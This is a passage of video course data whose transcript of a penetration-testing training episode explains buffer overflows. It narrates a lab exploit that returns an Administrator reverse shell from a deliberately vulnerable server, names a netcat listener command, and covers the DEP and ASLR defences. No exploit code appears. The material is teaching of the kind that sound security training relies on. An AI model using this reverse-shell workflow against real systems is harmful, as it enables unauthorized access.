vulnerabilities.\n\n846\n00:38:53.250 --> 00:38:56.460\nAnd this kind of stuff just,\nit's gathering information.\n\n847\n00:38:56.460 --> 00:39:01.190\nThat we might then be able to use in\nour penetration test or in our attack.\n\n848\n00:39:01.190 --> 00:39:02.770\nSo, we thank you for that Daniel.\n\n849\n00:39:02.770 --> 00:39:05.170\nWe hope everybody out there\nenjoyed watching this one.\n\n850\n00:39:05.170 --> 00:39:08.070\nSigning off for IT Pro TV,\nI've been your host Mike Rodrick.\n\n851\n00:39:08.070 --> 00:39:08.860\n&gt;&gt; I'm Daniel Lowrie.\n\n852\n00:39:08.860 --> 00:39:13.841\n&gt;&gt; And we'll see you next time.\n\n853\n00:39:13.841 --> 00:39:17.165\n[MUSIC]\n\n854\n00:39:17.165 --> 00:39:19.669\nThank you for watching IT Pro TV.\n\n",
          "vimeoId": "202063933"
        },
        {
          "description": "In this episode, Dan and Mike begin their look into buffer overflow attacks. They explain what a buffer overflow is and what causes them. They also set up a debugger to create a buffer overflow attack.",
          "length": "1584",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-1-buffer_overflows-013117-PGM.00_26_10_21.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-1-buffer_overflows-013117-PGM.00_26_10_21.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-1-buffer_overflows-013117-PGM.00_26_10_21.Still001-sm.jpg",
          "title": "Buffer Overflows",
          "transcript": "WEBVTT\n\n1\n00:00:00.025 --> 00:00:06.067\n[CROSSTALK]\nYou're\n\n2\n00:00:06.067 --> 00:00:12.488\nwatching ITProTV.\n\n3\n00:00:12.488 --> 00:00:15.470\n&gt;&gt; Hello welcome to another\nexciting episode here at ITProTV.\n\n4\n00:00:15.470 --> 00:00:20.930\nI'm your host Mike Rodrick and\ntoday we are doing penetration testing.\n\n5\n00:00:20.930 --> 00:00:21.890\nThat's right.\n\n6\n00:00:21.890 --> 00:00:26.480\nIn this episode we're going to be focusing\nin on a big part of penetration testing,\n\n7\n00:00:26.480 --> 00:00:30.310\na big part of a lot of attacks that\nwe see out there on the Internet,\n\n8\n00:00:30.310 --> 00:00:34.890\nin the wild, based on something\nknown as a buffer overflow.\n\n9\n00:00:34.890 --> 00:00:36.360\nOoh, good stuff there.\n\n10\n00:00:36.360 --> 00:00:40.350\nAnd here to explain to us what\na buffer overflow even means,\n\n11\n00:00:40.350 --> 00:00:44.680\nhow it does what it does, or\nwhy it does what it does, and\n\n12\n00:00:44.680 --> 00:00:48.030\nmaybe even how to do it ourselves,\nis Mr. Daniel Lowrie.\n\n13\n00:00:48.030 --> 00:00:49.200\nWelcome back Daniel.\n\n14\n00:00:49.200 --> 00:00:50.180\n&gt;&gt; So glad to be back.\n\n15\n00:00:50.180 --> 00:00:54.370\nSo we're continuing on with our\npenetration testing show as Mike as been\n\n16\n00:00:54.370 --> 00:00:56.582\nalluding to, not so unsubtlely.\n\n17\n00:00:56.582 --> 00:00:57.094\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n18\n00:00:57.094 --> 00:00:58.730\n&gt;&gt; If that makes any sense.\n\n19\n00:00:58.730 --> 00:01:01.100\nAnd we are continuing on,\nbut forever flows.\n\n20\n00:01:01.100 --> 00:01:03.790\nThis is a weird topic, I say weird topic,\n\n21\n00:01:03.790 --> 00:01:07.360\nprobably a topic that is\nshrouded in mystique.\n\n22\n00:01:07.360 --> 00:01:09.790\nRight?\nIf you've taken a security class before,\n\n23\n00:01:09.790 --> 00:01:12.250\nI guarantee you've heard\nthe term buffer overflow.\n\n24\n00:01:12.250 --> 00:01:16.250\nBut if you've haven't security class\nbefore, you decided you know what I'm\n\n25\n00:01:16.250 --> 00:01:19.920\ngonna get into IT and this happens to be\nthe first show you've ever seen about it.\n\n26\n00:01:19.920 --> 00:01:22.882\nBuffer overflow you're like yeah\nthat means absolutely zilcho to me.\n\n27\n00:01:22.882 --> 00:01:23.590\n&gt;&gt; [LAUGH].\n\n28\n00:01:23.590 --> 00:01:26.870\nSo let's, we're gonna start there,\ngive you some kind of back story.\n\n29\n00:01:26.870 --> 00:01:29.300\nWhat a buffer overflow is,\nhow they work, and\n\n30\n00:01:29.300 --> 00:01:33.100\nwhy we want to be able to do it,\nand you know what?\n\n31\n00:01:33.100 --> 00:01:35.620\nI think I wanna Tarantino this.\n\n32\n00:01:35.620 --> 00:01:38.570\n&gt;&gt; Yeah?\n&gt;&gt; I'm gonna start with the end, with what\n\n33\n00:01:38.570 --> 00:01:43.000\nwe're gonna do, and see that work, and\nthen we're gonna show you how we did it.\n\n34\n00:01:43.000 --> 00:01:43.910\n&gt;&gt; I like it.\n&gt;&gt; How does that work?\n\n35\n00:01:43.910 --> 00:01:45.710\nAll right,\nwe're gonna jump right into the fray.\n\n36\n00:01:45.710 --> 00:01:47.300\nSo let's jump onto my computer.\n\n37\n00:01:47.300 --> 00:01:49.800\nI've got my Linux,\nKali Linux is up and running.\n\n38\n00:01:49.800 --> 00:01:53.240\nI also have my Windows 7 machine as well.\n\n39\n00:01:53.240 --> 00:01:55.460\nWindow 7 machine is gonna act as a server,\nall right.\n\n40\n00:01:55.460 --> 00:01:59.440\nIt's running a vulnerable server,\nsomething vulnerable to a buffer overflow.\n\n41\n00:01:59.440 --> 00:02:01.330\nActually it's not yet, but\nI have to actually start that.\n\n42\n00:02:01.330 --> 00:02:02.720\nSo let's do that.\n\n43\n00:02:02.720 --> 00:02:04.790\nAnd it's so aptly called vuln.server.\n\n44\n00:02:04.790 --> 00:02:07.762\nI will let you know right now\nyou can go out to the interwebs,\n\n45\n00:02:07.762 --> 00:02:10.150\nGoogle vuln.server, and download this.\n\n46\n00:02:10.150 --> 00:02:12.930\nSo that's something you probably want\nto do if you want to practice these\n\n47\n00:02:12.930 --> 00:02:14.520\nthings as we go.\n\n48\n00:02:14.520 --> 00:02:16.920\n&gt;&gt; On your sandbox machine,\nnot your production machine.\n\n49\n00:02:16.920 --> 00:02:17.860\n&gt;&gt; Yeah, yeah.\n\n50\n00:02:17.860 --> 00:02:19.337\n&gt;&gt; Better mark that down.\n\n51\n00:02:19.337 --> 00:02:21.230\n&gt;&gt; [LAUGH].\n&gt;&gt; Mike's got safety tips for us all.\n\n52\n00:02:21.230 --> 00:02:23.760\nRight?\nHere's our little OSHA meeting.\n\n53\n00:02:23.760 --> 00:02:27.610\nDon't climb up over six feet without\na lanyard and don't attach this to some\n\n54\n00:02:27.610 --> 00:02:31.900\nserver that actually can touch\nthe internet because this is vulnerable by\n\n55\n00:02:31.900 --> 00:02:35.600\ndesign, right, so that you can practice\nthese exploits and things of that nature.\n\n56\n00:02:35.600 --> 00:02:40.510\nSo I'm going to run this as\nan administrator, because most services\n\n57\n00:02:40.510 --> 00:02:44.680\ndo run as some sort of service, or they'll\nhave a service account attached to it.\n\n58\n00:02:44.680 --> 00:02:46.770\nSo this could have been a service account.\n\n59\n00:02:46.770 --> 00:02:50.100\nSome people just fire up services as\nan administrator because that's what\n\n60\n00:02:50.100 --> 00:02:51.360\nthey log in as.\n\n61\n00:02:51.360 --> 00:02:53.900\nThat would be beneficial for\neverybody that wants to do that.\n\n62\n00:02:53.900 --> 00:02:57.520\nSo now, my service is running, you can\nsee it's waiting for a client connection.\n\n63\n00:02:57.520 --> 00:02:59.530\nI am in my little testing lab here.\n\n64\n00:02:59.530 --> 00:03:00.650\nIf I do an ls,\n\n65\n00:03:00.650 --> 00:03:05.950\nI have my little python exploit that I've\nwritten right there, I will run that.\n\n66\n00:03:05.950 --> 00:03:08.390\nActually, I need to do one more thing,\nI need to open a Netcat listener,\n\n67\n00:03:08.390 --> 00:03:13.010\nbecause this is gonna\nreverse shell from that box.\n\n68\n00:03:13.010 --> 00:03:14.520\nSo I'm gonna open up another terminal.\n\n69\n00:03:15.700 --> 00:03:17.660\nI'm gonna bring it down now.\n\n70\n00:03:17.660 --> 00:03:22.700\nI'm just gonna kinda resize it here so\nit will sit in the bottom.\n\n71\n00:03:22.700 --> 00:03:26.530\nAnd now we will run an exploit,\nand it's called sploit.\n\n72\n00:03:26.530 --> 00:03:29.940\nI gotta start my stinking list here.\n\n73\n00:03:29.940 --> 00:03:32.020\n&gt;&gt; I was gonna say,\nyou just throw that out the window.\n\n74\n00:03:32.020 --> 00:03:33.330\n&gt;&gt; Man, I'm so excited to do this, right.\n\n75\n00:03:33.330 --> 00:03:34.380\nI just wanna get to it.\n\n76\n00:03:34.380 --> 00:03:37.080\nRight, so don't forget to start your\nNetCat listener if you're doing a reverse\n\n77\n00:03:37.080 --> 00:03:39.820\nshell, which we are going to do.\n\n78\n00:03:39.820 --> 00:03:42.550\nSo nc-nlv and then whatever port.\n\n79\n00:03:42.550 --> 00:03:45.080\nI actually did use port 5555 on this one.\n\n80\n00:03:45.080 --> 00:03:48.170\nI know in the NetCat\nshow I typically 9999.\n\n81\n00:03:48.170 --> 00:03:51.560\nBut guess what vuln.server is using?\n\n82\n00:03:51.560 --> 00:03:54.160\n9999, right?\nThey love the 9999 as well.\n\n83\n00:03:54.160 --> 00:03:56.170\nI guess great minds think alike.\n\n84\n00:03:56.170 --> 00:03:59.880\nSo, just to keep things\nwhere they need to be,\n\n85\n00:03:59.880 --> 00:04:02.770\ndon't get confused, I used 5555, sorry.\n\n86\n00:04:02.770 --> 00:04:08.250\nCrank that up, I'm now listening, now\nI'm gonna run my exploit, look at that.\n\n87\n00:04:08.250 --> 00:04:09.540\nLook down here.\n\n88\n00:04:09.540 --> 00:04:12.650\nBaddabing, I've changed my prompt,\nthe shell is here.\n\n89\n00:04:12.650 --> 00:04:18.722\nIf I do a who am I,\nit says I am running as Administrator.\n\n90\n00:04:18.722 --> 00:04:20.700\nThat's interesting.\n\n91\n00:04:20.700 --> 00:04:21.940\nI have full control of this box.\n\n92\n00:04:21.940 --> 00:04:25.310\nI can add users do whatever I want right\nnow if I know the proper commands, and\n\n93\n00:04:25.310 --> 00:04:28.700\nif I've gotten this far, I probably have\nthe where-with-all to make that happen.\n\n94\n00:04:28.700 --> 00:04:30.560\nSo that's the end all.\n\n95\n00:04:30.560 --> 00:04:33.160\nActually it's kind of uneventful.\n\n96\n00:04:33.160 --> 00:04:37.150\n&gt;&gt; I was gonna say, that was kind of a let\ndown I mean all you basically did was set\n\n97\n00:04:37.150 --> 00:04:41.880\nup a NetCat listener, push over this,\nrun this script, and you're at a prompt,\n\n98\n00:04:41.880 --> 00:04:46.230\nand we saw you do that yesterday with no\nvulnerabilities, with no buffer overflows.\n\n99\n00:04:46.230 --> 00:04:50.020\nJust by using NetCator any\nof the other ones we use.\n\n100\n00:04:50.020 --> 00:04:51.300\n&gt;&gt; Yeah, totally, right?\n\n101\n00:04:51.300 --> 00:04:56.590\nAnd if you watch the NetCat show or the\nshells and reverse shell show that we did.\n\n102\n00:04:56.590 --> 00:04:59.050\nYou're probably going, yeah,\nthat kinda looks just like that,\n\n103\n00:04:59.050 --> 00:05:00.890\njust like what Mike was talking about.\n\n104\n00:05:00.890 --> 00:05:04.920\n&gt;&gt; But I think the subtle difference\nthat people might not catch on was,\n\n105\n00:05:04.920 --> 00:05:08.290\nyou never logged on at the Windows\nbox to do the other half.\n\n106\n00:05:08.290 --> 00:05:11.330\nIn the episode we did the used NetCat and\nthen see.\n\n107\n00:05:11.330 --> 00:05:14.590\nWe went to one machine, setup a listener,\nwent to the other machine\n\n108\n00:05:14.590 --> 00:05:17.420\nas administrator, logged in and\nintentionally connected.\n\n109\n00:05:17.420 --> 00:05:21.130\n&gt;&gt; In this one,\nall we saw you do was run a service,\n\n110\n00:05:21.130 --> 00:05:24.720\nwhich could be any service that\nnormally runs on that machine.\n\n111\n00:05:24.720 --> 00:05:27.860\nSo nothing is set up on that side\nother than the vulnerable service.\n\n112\n00:05:27.860 --> 00:05:31.210\nAnd then all your NetCat commands were\ndone on the attacker side, right.\n\n113\n00:05:31.210 --> 00:05:32.560\nYou never had to log in and\n\n114\n00:05:32.560 --> 00:05:35.170\ndo anything to establish\na connection from the other side.\n\n115\n00:05:35.170 --> 00:05:36.310\n&gt;&gt; That's exactly right.\n\n116\n00:05:36.310 --> 00:05:40.730\nWell I did, but here's the difference\nbetween what you saw in the previous show\n\n117\n00:05:40.730 --> 00:05:44.603\nversus what you are seeing right now,\nis that server that is running on that\n\n118\n00:05:44.603 --> 00:05:49.180\nWindows machine, put it in your\nmind's eye as this, that's some\n\n119\n00:05:49.180 --> 00:05:53.210\nserver out on the internet that's running\nthis service and it's vulnerable.\n\n120\n00:05:53.210 --> 00:05:56.640\n&gt;&gt; And it's a server that whoever's\nrunning it needs and wants to be running.\n\n121\n00:05:56.640 --> 00:05:58.910\nIt's not like they set it up so\nyou could attack.\n\n122\n00:05:58.910 --> 00:06:02.430\nThey're like, hey we need this web server\nhere's the software I'm gonna use,\n\n123\n00:06:02.430 --> 00:06:03.930\nlet's run it.\n\n124\n00:06:03.930 --> 00:06:05.020\n&gt;&gt; Exactly, that's it.\n\n125\n00:06:05.020 --> 00:06:08.540\nIt's like if anybody was running\na website, or running an FTP server,\n\n126\n00:06:08.540 --> 00:06:10.240\nor running a mail server,\n\n127\n00:06:10.240 --> 00:06:13.070\nall these things are typically\naccessible from the internet.\n\n128\n00:06:13.070 --> 00:06:17.160\nThey don't mean you to be able to gain\nroot access to their machines, they mean\n\n129\n00:06:17.160 --> 00:06:21.750\nto give services to their users of who\nhave a valid account to those machines.\n\n130\n00:06:21.750 --> 00:06:24.390\nIn this instance right here,\nwhat we're looking at right now,\n\n131\n00:06:24.390 --> 00:06:28.510\nI technically do not have a valid account,\nI am not a user of that system.\n\n132\n00:06:28.510 --> 00:06:31.960\nWhat I've done is exploited\na vulnerability in that system,\n\n133\n00:06:31.960 --> 00:06:36.610\nwhich allowed me to execute my own code\nand give me route access to it and\n\n134\n00:06:36.610 --> 00:06:37.640\nshovel the shell to me.\n\n135\n00:06:37.640 --> 00:06:39.900\nI told it, give me shell, right?\n\n136\n00:06:39.900 --> 00:06:41.650\nNormally, that is not what would happen.\n\n137\n00:06:41.650 --> 00:06:43.250\nAnd let's take a look at that.\n\n138\n00:06:43.250 --> 00:06:45.200\nLet's login to that machine.\n\n139\n00:06:45.200 --> 00:06:50.600\nI've probably crashed it by now\nbecause I'm, well, I'm yeah.\n\n140\n00:06:50.600 --> 00:06:51.370\nThe vulnerability does that.\n\n141\n00:06:51.370 --> 00:06:52.640\nIt's just not running anymore.\n\n142\n00:06:52.640 --> 00:06:54.040\nSo let's restart the service.\n\n143\n00:06:55.880 --> 00:06:57.550\nAnd let's actually log into it,\n\n144\n00:06:57.550 --> 00:07:00.710\nand see what it normally\nwould like to a normal user.\n\n145\n00:07:00.710 --> 00:07:04.293\nIf I, I could use my good old nc for that.\n\n146\n00:07:04.293 --> 00:07:08.288\nnv to, it is 192.168.2.19.200i.\n\n147\n00:07:08.288 --> 00:07:12.451\nI set a static IP for this one just so\n\n148\n00:07:12.451 --> 00:07:16.510\nwe don't get confused here.\n\n149\n00:07:16.510 --> 00:07:18.580\nAnd then it's running on port 9999.\n\n150\n00:07:18.580 --> 00:07:22.100\nSo now I've logged into vuln.server,\nI can enter help for help, so\n\n151\n00:07:22.100 --> 00:07:25.385\nI can say help like that and\nit gives me a list of commands.\n\n152\n00:07:25.385 --> 00:07:26.543\nThis is typically it.\n\n153\n00:07:26.543 --> 00:07:29.965\nIf I logged into a mail server\nit has a list of commands.\n\n154\n00:07:29.965 --> 00:07:32.465\nAnd if I know the system I\ncan use the commands and\n\n155\n00:07:32.465 --> 00:07:35.005\nperform actions that\nthe service allows for me.\n\n156\n00:07:35.005 --> 00:07:38.215\nSame idea here,\nthis one is just designed purposefully for\n\n157\n00:07:38.215 --> 00:07:39.795\nyou to learn buffer overflow.\n\n158\n00:07:39.795 --> 00:07:41.905\nSo I will show you.\n\n159\n00:07:41.905 --> 00:07:45.835\nLike I said, you can just go onto\nGoogle and type in vuln.server, and\n\n160\n00:07:45.835 --> 00:07:47.705\nyou'll be able to find\nthe download link for this.\n\n161\n00:07:47.705 --> 00:07:48.885\nIt's pretty simple to find.\n\n162\n00:07:49.940 --> 00:07:52.950\nBut that's it, and then I can do exit.\n\n163\n00:07:52.950 --> 00:07:54.998\nAnd it will shut down.\n\n164\n00:07:54.998 --> 00:07:57.018\nThat's how it's designed to run.\n\n165\n00:07:57.018 --> 00:08:01.273\nWe're going to, we made it run in a way\nit wasn't designed to do which was Give\n\n166\n00:08:01.273 --> 00:08:04.090\nme shell access with\nadministrative privileges or\n\n167\n00:08:04.090 --> 00:08:07.380\nprivileges of whatever user is\nrunning it to that machine.\n\n168\n00:08:07.380 --> 00:08:10.754\nNot designed to do, well see it\nis designed to do that, but most\n\n169\n00:08:10.754 --> 00:08:15.488\nservices aren't even though some services\nhave a vulnerability to buffer overflows.\n\n170\n00:08:15.488 --> 00:08:19.530\nAnd that's what we use to be able to do\nthat very thing was a buffer overflow.\n\n171\n00:08:19.530 --> 00:08:21.079\nIt was susceptible to that.\n\n172\n00:08:21.079 --> 00:08:22.357\n&gt;&gt; All right Daniel, so\n\n173\n00:08:22.357 --> 00:08:26.970\nlet's talk then a little bit about\nwhat a buffer overflow actually is.\n\n174\n00:08:26.970 --> 00:08:28.264\n&gt;&gt; Yeah, good place to start, right?\n\n175\n00:08:28.264 --> 00:08:29.728\nCuz now you're like,\nokay this buffer overflow thing-\n\n176\n00:08:29.728 --> 00:08:30.781\n&gt;&gt; Which two it does.\n\n177\n00:08:30.781 --> 00:08:31.900\n&gt;&gt; It seems interesting.\n\n178\n00:08:31.900 --> 00:08:32.410\nTell me more.\n\n179\n00:08:32.410 --> 00:08:33.395\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Yeah,\n\n180\n00:08:33.395 --> 00:08:34.438\nthat's what we're gonna do.\n\n181\n00:08:34.438 --> 00:08:36.340\nSo what is a buffer overflow?\n\n182\n00:08:36.340 --> 00:08:37.360\nSo when you load a program,\n\n183\n00:08:37.360 --> 00:08:41.290\nwhen you start a program,\nif you're any aware of computers,\n\n184\n00:08:41.290 --> 00:08:43.580\nyou've been working in technology,\nyou know a little bit about that.\n\n185\n00:08:43.580 --> 00:08:45.760\nAnd that's really all you need to know,\n\n186\n00:08:45.760 --> 00:08:48.580\nmaybe a little bit more\non how programs work.\n\n187\n00:08:48.580 --> 00:08:51.580\nThe executable fires off,\nit loads into memory.\n\n188\n00:08:51.580 --> 00:08:54.100\nMemory stores it there so\nthat you can run it.\n\n189\n00:08:54.100 --> 00:08:55.650\nIt has a set of instructions.\n\n190\n00:08:55.650 --> 00:08:57.160\nIt has a set of options.\n\n191\n00:08:57.160 --> 00:09:01.660\nMaybe you could input data and\nit can output data, things of that nature.\n\n192\n00:09:01.660 --> 00:09:05.972\nAnd, what happens is, is when you're\nable to input data into a system,\n\n193\n00:09:05.972 --> 00:09:10.340\nyou gotta remember, that's loaded\nup into the memory of the system.\n\n194\n00:09:10.340 --> 00:09:14.980\nIf I'm able to throw so much data at\nit that it doesn't know what to do,\n\n195\n00:09:16.460 --> 00:09:18.760\nthen we might get the program to crash,\nright?\n\n196\n00:09:18.760 --> 00:09:22.260\nBecause if it doesn't know what to do,\nit says, I don't know what to do, and\n\n197\n00:09:22.260 --> 00:09:23.322\nstops working.\n\n198\n00:09:23.322 --> 00:09:26.790\nIf there's nothing in there to say, if you\nfound something and you don't know what to\n\n199\n00:09:26.790 --> 00:09:29.460\ndo then do this, well then\ntechnically it does know what to do.\n\n200\n00:09:29.460 --> 00:09:32.160\nDo that thing that you\nbecause something's happening\n\n201\n00:09:32.160 --> 00:09:33.658\nthat you're not supposed to be aware of.\n\n202\n00:09:33.658 --> 00:09:35.610\nSo, we're gonna exploit that.\n\n203\n00:09:35.610 --> 00:09:36.459\nThat's what's happening.\n\n204\n00:09:36.459 --> 00:09:40.601\nBuffer overflows is basically taking that,\nwe're gonna cram data at it so\n\n205\n00:09:40.601 --> 00:09:44.740\nthat it doesn't know what to do with it,\nand that's part of the equation,\n\n206\n00:09:44.740 --> 00:09:48.882\nto be susceptible it has to make sure\nthat what's called bounds checking is\n\n207\n00:09:48.882 --> 00:09:50.185\nnot enabled, right?\n\n208\n00:09:50.185 --> 00:09:54.260\nThat protections aren't put into place to\nkeep these kind of things from happening.\n\n209\n00:09:54.260 --> 00:09:56.980\nSo just because we know how to\n\n210\n00:09:56.980 --> 00:10:00.800\nfind maybe a susceptible doesn't\nmean it's going to happen, okay?\n\n211\n00:10:00.800 --> 00:10:02.480\nJust keep that in mind.\n\n212\n00:10:02.480 --> 00:10:04.970\nYou can't just go grab a random\nprogram and go well it takes input,\n\n213\n00:10:04.970 --> 00:10:07.630\nI'm just gonna cram input\nat it until it crashes.\n\n214\n00:10:07.630 --> 00:10:08.660\nIt might not crash.\n\n215\n00:10:08.660 --> 00:10:11.300\nAnd even if it does crash, it doesn't\nnecessarily mean you're going to get to\n\n216\n00:10:11.300 --> 00:10:14.600\nbuffer overflow land and get that\nreverse shell that we were looking for.\n\n217\n00:10:14.600 --> 00:10:18.830\nSo just keep that in mind when we're\ntalking about practicality, real life.\n\n218\n00:10:18.830 --> 00:10:21.380\nThis is designed to do it so\nthat I can actually show you that,\n\n219\n00:10:21.380 --> 00:10:24.415\ncuz otherwise this show's\ngoing no where real fast.\n\n220\n00:10:24.415 --> 00:10:27.488\n[LAUGH] So\njust I want to keep that in the mind.\n\n221\n00:10:27.488 --> 00:10:31.646\n&gt;&gt; So, I guess, and just to rephrase to\nmake sure I understand what you're saying,\n\n222\n00:10:31.646 --> 00:10:35.410\nan application is typically\nassigned memory when it starts up.\n\n223\n00:10:35.410 --> 00:10:38.370\nAnd that assignment is saying\nyou get from here to here.\n\n224\n00:10:38.370 --> 00:10:42.160\nYou get this much, for round numbers\nlet's say you get one megabyte of memory.\n\n225\n00:10:42.160 --> 00:10:45.780\nSo that's the application's memory where\nit can do whatever it needs, calculations,\n\n226\n00:10:45.780 --> 00:10:48.290\nstoring data from user input or whatever.\n\n227\n00:10:48.290 --> 00:10:52.360\nA buffer overflow is when\nwe try to put more data,\n\n228\n00:10:52.360 --> 00:10:55.260\ngive that program more data\nthan it has room to store.\n\n229\n00:10:55.260 --> 00:10:58.930\nAnd then if the application doesn't\nhave rules in place that say, hey look,\n\n230\n00:10:58.930 --> 00:11:01.460\nI'm getting close to my max,\nI'm gonna stop taking input.\n\n231\n00:11:01.460 --> 00:11:03.460\nIf it continues to take the input but\n\n232\n00:11:03.460 --> 00:11:07.790\nhas nowhere to put it,\nthat's when we overflow the buffer.\n\n233\n00:11:07.790 --> 00:11:11.240\n&gt;&gt; That's right, and we're gonna see\nthese things called registers, and\n\n234\n00:11:11.240 --> 00:11:15.270\nthis is where they, kinda,\nhold temporary data for purposes of use.\n\n235\n00:11:15.270 --> 00:11:20.160\nAnd guess what, you can, whatever\nthat data is, it's going to use it.\n\n236\n00:11:20.160 --> 00:11:23.980\nSo, if that data is our arbitrary code\nthat we've pushed in, see that's what\n\n237\n00:11:23.980 --> 00:11:29.420\nhappens is we're gonna basically override\nthe data that's supposed to go in there.\n\n238\n00:11:29.420 --> 00:11:33.090\nI can take a certain amount of input,\nbut if you give me too much,\n\n239\n00:11:33.090 --> 00:11:35.330\nwell I'm just gonna start to\ntry to put it wherever I can.\n\n240\n00:11:35.330 --> 00:11:37.320\nWell, I'll put it here,\nand I'll put it there.\n\n241\n00:11:37.320 --> 00:11:40.020\nAnd we're pushing out what\nnormally would go there.\n\n242\n00:11:40.020 --> 00:11:43.290\nAnd we're overriding it,\nhence the overflow, all right?\n\n243\n00:11:43.290 --> 00:11:45.710\nSo that's basically what's happening here.\n\n244\n00:11:45.710 --> 00:11:47.050\nHopefully that makes sense.\n\n245\n00:11:47.050 --> 00:11:51.107\nIt'll probably make a whole lot more sense\nas we start really diving into this and\n\n246\n00:11:51.107 --> 00:11:52.610\nwe're looking at that data.\n\n247\n00:11:52.610 --> 00:11:55.030\nAnd you're gonna go that's\nwhat he's talking about.\n\n248\n00:11:55.030 --> 00:11:56.475\nOkay, that makes sense.\n\n249\n00:11:56.475 --> 00:11:59.330\nBecause talking about it is one thing,\nseeing it and\n\n250\n00:11:59.330 --> 00:12:01.650\ndoing it is a complete different story.\n\n251\n00:12:01.650 --> 00:12:05.460\nAnd it does make a whole lot more sense\nas we actually perform these acts.\n\n252\n00:12:05.460 --> 00:12:07.960\nSo, let's see here,\nwhat do I wanna talk about?\n\n253\n00:12:07.960 --> 00:12:10.425\nMake sure I didn't miss anything,\ngo over my notes really quickly.\n\n254\n00:12:10.425 --> 00:12:13.552\nMalicious code spilling in a member\nspace that will run itself.\n\n255\n00:12:13.552 --> 00:12:14.764\nWhat causes a buffer overflow.\n\n256\n00:12:14.764 --> 00:12:18.680\nRemember that is improper\nhandling of inputs.\n\n257\n00:12:18.680 --> 00:12:22.220\nSo we're gonna throw everything and the\nkitchen sink at it and see what it does.\n\n258\n00:12:22.220 --> 00:12:26.330\nAgain, hacker mindset, I know what it's\nsupposed to do, what can I make it do?\n\n259\n00:12:26.330 --> 00:12:28.877\nAnd if crashing is something\nI can make it do, well then,\n\n260\n00:12:28.877 --> 00:12:31.280\nI've learned something about this system,\nright?\n\n261\n00:12:31.280 --> 00:12:36.355\nIf I want it to crash, I can do x,\ncuz I learned I can do that.\n\n262\n00:12:36.355 --> 00:12:39.270\nLet's do talk about some guards\nagainst buffer overflow because they\n\n263\n00:12:39.270 --> 00:12:40.590\nare important.\n\n264\n00:12:40.590 --> 00:12:45.110\nJust a couple of them\nthat I want to speak of.\n\n265\n00:12:45.110 --> 00:12:49.110\nOne is them called\nData Execution Protection or DEP.\n\n266\n00:12:49.110 --> 00:12:52.158\nAs I am horrible, I remember the acronym\nbut I never remember what they stand for,\n\n267\n00:12:52.158 --> 00:12:53.276\nso I am reading my sheet here.\n\n268\n00:12:53.276 --> 00:12:58.524\nData Execution Protection, and what it\ndoes is it double checks the memory\n\n269\n00:12:58.524 --> 00:13:04.280\nto make sure that what is supposed to\nbe in there is exactly what's in there.\n\n270\n00:13:04.280 --> 00:13:05.910\nSo you load the program into memories.\n\n271\n00:13:05.910 --> 00:13:07.390\nIt kind of takes a snapshot.\n\n272\n00:13:07.390 --> 00:13:08.398\nThis is what it looks like.\n\n273\n00:13:08.398 --> 00:13:10.189\nThis is how it's supposed to operate.\n\n274\n00:13:10.189 --> 00:13:14.768\nThen when you go to run or execute\nsome instruction to that program well,\n\n275\n00:13:14.768 --> 00:13:17.140\nit may be some malicious code.\n\n276\n00:13:17.140 --> 00:13:19.500\nIt compares it and says, well,\nthis is what it's supposed to like and\n\n277\n00:13:19.500 --> 00:13:21.160\nwhat the heck is this?\n\n278\n00:13:21.160 --> 00:13:22.530\nThat's not right.\n\n279\n00:13:22.530 --> 00:13:24.940\nThat's not,\nit's supposed to look like this.\n\n280\n00:13:24.940 --> 00:13:26.160\nEh eh wrong you're not doing it.\n\n281\n00:13:26.160 --> 00:13:31.135\nSo, this can cause our buffer overflows to\nnot work even if we might be able to get\n\n282\n00:13:31.135 --> 00:13:34.344\nthat far,\nthe DEP might stop us in our rough level.\n\n283\n00:13:34.344 --> 00:13:35.290\nThis is good coding.\n\n284\n00:13:35.290 --> 00:13:37.100\nIf you're a coder and\n\n285\n00:13:37.100 --> 00:13:41.120\nyou're keeping security in mind you're\nimplementing these types of features.\n\n286\n00:13:41.120 --> 00:13:48.950\nThe other one is Address Space\nLayout Randomization or ASLR.\n\n287\n00:13:48.950 --> 00:13:52.728\nAnd this is a sneaky little thing.\n\n288\n00:13:52.728 --> 00:13:54.094\n&gt;&gt; [LAUGH] It is.\n&gt;&gt; There are smart people\n\n289\n00:13:54.094 --> 00:13:55.599\nthat come up with these protections.\n\n290\n00:13:55.599 --> 00:13:56.831\n&gt;&gt; They make it so hard.\n\n291\n00:13:56.831 --> 00:13:59.088\n&gt;&gt; Yeah, that's kind of the point.\n\n292\n00:13:59.088 --> 00:14:00.690\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n293\n00:14:00.690 --> 00:14:01.548\n&gt;&gt; They wanna make it so\n\n294\n00:14:01.548 --> 00:14:03.874\nhard you just say,\nI'm not doing this, forget this.\n\n295\n00:14:03.874 --> 00:14:05.660\nI'm gonna go be a truck driver or\nsomething.\n\n296\n00:14:05.660 --> 00:14:07.935\nYou know no offense,\nmy dad was a truck driver.\n\n297\n00:14:07.935 --> 00:14:09.999\n[LAUGH] That's a great job\nto be honest with you.\n\n298\n00:14:09.999 --> 00:14:12.277\nWell, what does ASLR do?\n\n299\n00:14:12.277 --> 00:14:14.213\nWhat ASLR does is it says,\n\n300\n00:14:14.213 --> 00:14:18.630\nwhen I load a program into memory\nI assign it a memory space.\n\n301\n00:14:18.630 --> 00:14:20.573\nAnd here you go,\nthat's where your function goes.\n\n302\n00:14:20.573 --> 00:14:23.596\nThat's where this function goes,\nthis instruction check gets this memory\n\n303\n00:14:23.596 --> 00:14:25.590\nallocation, and\nthat's where these things go.\n\n304\n00:14:27.300 --> 00:14:30.232\nIf I can predict that because it\ndoes the same place every time,\n\n305\n00:14:30.232 --> 00:14:33.080\nevery time I load that program up,\nit says, okay, this goes here and\n\n306\n00:14:33.080 --> 00:14:35.980\nthis goes here and this goes here,\nand it does that way every time.\n\n307\n00:14:35.980 --> 00:14:37.150\nThat's good for me as the hacker.\n\n308\n00:14:37.150 --> 00:14:41.900\nIt's good for me as the pen tester,\nbecause I can predict those values.\n\n309\n00:14:41.900 --> 00:14:45.700\nThat makes it easy for me to find those\nvalues cuz I know where they 